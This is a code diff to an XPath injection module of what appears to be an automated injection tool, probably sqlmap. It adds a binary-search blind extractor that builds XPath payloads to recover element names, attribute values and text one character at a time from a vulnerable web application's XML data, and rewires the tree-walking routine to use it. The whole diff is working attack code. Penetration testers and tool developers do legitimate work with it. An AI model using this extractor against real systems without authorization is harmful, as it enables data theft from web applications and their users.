@@ -308,6 +308,20 @@ class _XPathPayloadBuilder(object):
     def textStartsWith(self, path, prefix):
         return self._make("starts-with(string(%s),%s)" % (path, _xpathQuote(prefix)))
 
+    def stringLengthAtLeast(self, target, n):
+        return self._make("string-length(%s)>=%d" % (target, n))
+
+    def charPresent(self, target, pos):
+        # True when the character at 1-based position `pos` of `target` belongs to
+        # the known ordered charset (so its index can be resolved by bisection).
+        return self._make("contains(%s,substring(%s,%d,1))" % (_CS_LITERAL, target, pos))
+
+    def charIndexAtLeast(self, target, pos, n):
+        # The 0-based index of a charset member equals the length of the charset
+        # prefix preceding it (XPath 1.0 has no lexicographic '<', but
+        # string-length(substring-before(...)) yields a number we can bisect on).
+        return self._make("string-length(substring-before(%s,substring(%s,%d,1)))>=%d" % (_CS_LITERAL, target, pos, n))
+
 
 def _makeOracle(place, parameter, template):
     """Build an oracle from a verified true template. extract(payload) returns
@@ -360,6 +374,11 @@ for _ in xrange(XPATH_CHAR_MIN, XPATH_CHAR_MAX + 1):
     if _ not in _META_ORDS and _ not in _CHARSET:
         _CHARSET.append(_)
 
+# Codepoint-ordered charset used by the binary-search extractor. Ordering here MUST match
+# the literal string `_CS_LITERAL` so that a recovered index maps back to the right character.
+_CS_ORDS = [_ for _ in xrange(XPATH_CHAR_MIN, XPATH_CHAR_MAX + 1) if _ not in _META_ORDS]
+_CS_LITERAL = _xpathQuote("".join(chr(_) for _ in _CS_ORDS))
+
 
 def _inferValue(oracle, builder, path, getter, maxLen=XPATH_MAX_LENGTH):
     """Blindly infer a string value at `path` using `getter(builder, path, prefix)`.
@@ -407,6 +426,52 @@ def _inferCount(oracle, builder, path, countFn, maxCount=128):
     return lo
 
 
+def _inferString(oracle, builder, target, maxLen=XPATH_MAX_LENGTH):
+    """Blindly recover the string value of XPath expression `target` (e.g.
+    "name(/*)" or "string(/*[1]/@*[1])") using binary search.
+
+    The length is bisected first, then each character is resolved by bisecting
+    its index inside the ordered charset. This needs ~log2(len) requests per
+    character versus the linear charset scan in _inferValue(), which matters a
+    lot when walking a whole document tree. Characters outside the charset are
+    surfaced as '?' so the rest of the value is still recovered."""
+
+    if not oracle.extract(builder.stringLengthAtLeast(target, 1)):
+        return None
+
+    lo, hi = 1, maxLen
+    while lo < hi:
+        mid = (lo + hi + 1) // 2
+        if oracle.extract(builder.stringLengthAtLeast(target, mid)):
+            lo = mid
+        else:
+            hi = mid - 1
+    length = lo
+
+    chars = []
+    probes = 0
+    last = len(_CS_ORDS) - 1
+    for pos in xrange(1, length + 1):
+        probes += 1
+        if not oracle.extract(builder.charPresent(target, pos)):
+            chars.append("?")
+            continue
+
+        clo, chi = 0, last
+        while clo < chi:
+            cmid = (clo + chi + 1) // 2
+            probes += 1
+            if oracle.extract(builder.charIndexAtLeast(target, pos, cmid)):
+                clo = cmid
+            else:
+                chi = cmid - 1
+        chars.append(chr(_CS_ORDS[clo]))
+
+    value = "".join(chars)
+    logger.debug("XPath blind inference: %d probes (length=%d)" % (probes, length))
+    return value or None
+
+
 def _walkTree(oracle, builder, path="/*", depth=0):
     """Recursively walk the XML tree from a given XPath expression.
     Returns a dict: {name, path, children, attributes, text} or None."""
@@ -414,8 +479,7 @@ def _walkTree(oracle, builder, path="/*", depth=0):
     if depth > XPATH_MAX_DEPTH:
         return None
 
-    name = _inferValue(oracle, builder, path,
-                       lambda b, p, prefix: b.nameStartsWith(p, prefix))
+    name = _inferString(oracle, builder, "name(%s)" % path)
     if not name:
         return None
 
@@ -431,20 +495,17 @@ def _walkTree(oracle, builder, path="/*", depth=0):
 
     attributes = []
     for i in xrange(1, attrCount + 1):
-        attrName = _inferValue(oracle, builder, path,
-                               lambda b, p, prefix, idx=i: b.attributeNameStartsWith(p, idx, prefix))
+        attrName = _inferString(oracle, builder, "name(%s/@*[%d])" % (path, i))
         if not attrName:
             continue
 
-        attrValue = _inferValue(oracle, builder, path,
-                                lambda b, p, prefix, idx=i: b.attributeValueStartsWith(p, idx, prefix))
+        attrValue = _inferString(oracle, builder, "string(%s/@*[%d])" % (path, i))
         attributes.append({"name": attrName, "value": attrValue or ""})
         logger.info("  attribute: @%s='%s'" % (attrName, attrValue or ""))
 
     text = None
     if childCount == 0:
-        text = _inferValue(oracle, builder, path,
-                           lambda b, p, prefix: b.textStartsWith(p, prefix))
+        text = _inferString(oracle, builder, "string(%s)" % path)
 
     children = []
     for i in xrange(1, childCount + 1):
@@ -511,10 +572,10 @@ def xpathScan():
     global SENTINEL
     SENTINEL = randomStr(length=10, lowercase=True)
 
-    infoMsg = "'--xpath' is self-contained: it detects XPath injection in HTTP "
-    infoMsg += "parameters and walks the reachable XML document tree. SQL enumeration "
-    infoMsg += "switches (--banner, --dbs, --tables, --users, --sql-query) are ignored"
-    logger.info(infoMsg)
+    debugMsg = "'--xpath' is self-contained: it detects XPath injection in HTTP "
+    debugMsg += "parameters and walks the reachable XML document tree. SQL enumeration "
+    debugMsg += "switches (--banner, --dbs, --tables, --users, --sql-query) are ignored"
+    logger.debug(debugMsg)
 
     if not conf.paramDict:
         logger.error("no request parameters to test (use --data, GET params, or similar)")
